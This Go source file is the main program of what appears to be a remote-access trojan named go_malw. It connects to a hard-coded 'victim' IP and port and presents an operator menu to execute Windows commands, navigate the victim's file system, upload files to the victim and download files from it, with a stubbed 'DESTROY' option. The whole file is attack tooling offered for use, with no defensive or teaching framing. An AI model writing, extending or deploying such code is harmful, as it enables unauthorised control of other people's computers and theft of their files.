package main

import (
	"bufio"
	"fmt"
	"go_malw/server/core/Download"
	"go_malw/server/core/ExecuteCommandWindows"
	"go_malw/server/core/Move"
	"go_malw/server/core/Upload"
	"go_malw/server/core/color"
	"go_malw/server/core/handleConnection"
	"log"
	"net"
	"os"
	"strings"
)

type Data struct {
	Name string
	ID   int
	Age  float32
}

func options() {
	fmt.Println()
	fmt.Println(color.Green + "		[1] ExecuteCommands" + color.Reset)
	fmt.Println(color.Green + "		[2] Move in File System" + color.Reset)
	fmt.Println(color.Green + "		[3] Upload Files" + color.Reset)
	fmt.Println(color.Green + "		[4] Download Files" + color.Reset)
	//fmt.Println(color.Green + "		5] Download Folders" + color.Reset)
	//fmt.Println(color.Green + "		[5] DESTROY" + color.Reset)
	fmt.Println(color.Green + "		[99] Exit" + color.Reset)
	fmt.Println()
}

func DisplayError(err error) {
	if err != nil {
		fmt.Println(color.Red + "[-]" + color.Reset + err.Error())
	}
}

func main() {
	var connection net.Conn

	IP := "192.168.178.86"
	//IP := "147.53.196.47"
	Port := "9090"
	//Port := "8080"

	connection, err := handleConnection.ConnectionWithVictim(IP, Port)

	if err != nil {
		log.Fatal(err)
	}

	defer connection.Close()
	fmt.Println()
	fmt.Println(color.Green + "[+]" + color.Reset + " Connection established with " + color.Purple + connection.RemoteAddr().String() + color.Reset)
	fmt.Println()

	reader := bufio.NewReader(os.Stdin)
	loopControl := true

	for loopControl {
		options()
		fmt.Printf(color.Blue + "[*]" + color.Reset + " Enter Options: ")
		user_input_raw, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(color.Red + "[-]" + color.Reset + err.Error())
			continue
		}

		connection.Write([]byte(user_input_raw))
		user_input := strings.TrimSuffix(user_input_raw, "\n")

		switch {

		case user_input == "1":
			fmt.Println(color.Green + "[+]" + color.Reset + " Commnad Execution Program")
			err := ExecuteCommandWindows.ExecuteCommandRemotelyWindows(connection)
			DisplayError(err)

		case user_input == "2":
			fmt.Println(color.Green + "[+]" + color.Reset + " Navigating File System on Victim")
			err = Move.NavigateFileSystem(connection)
			DisplayError(err)

		case user_input == "3":
			fmt.Println(color.Green + "[+]" + color.Reset + " Uploading Files")
			err = Upload.UploadFile2Victim(connection)
			DisplayError(err)

		case user_input == "4":
			fmt.Println(color.Green + "[+]" + color.Reset + " Downloading Files")
			err = Download.DownloadFromVictim(connection)
			DisplayError(err)

		case user_input == "5":
			fmt.Println(color.Green + "[+]" + color.Reset + " DESTROYING...")
			err = Download.DownloadFromVictim(connection)
			DisplayError(err)

		/*case user_input == "5":
		fmt.Println(color.Green + "[+]" + color.Reset + " Downloading Folders")
		err = Download.DownloadFolderFromVictim(connection)
		DisplayError(err)*/

		case user_input == "99":
			fmt.Println(color.Green + "[+]" + color.Reset + " Exiting the program")
			loopControl = false

		default:
			fmt.Println(color.Red + "[-]" + color.Reset + " Invalid option, try again")
		}
	}
}
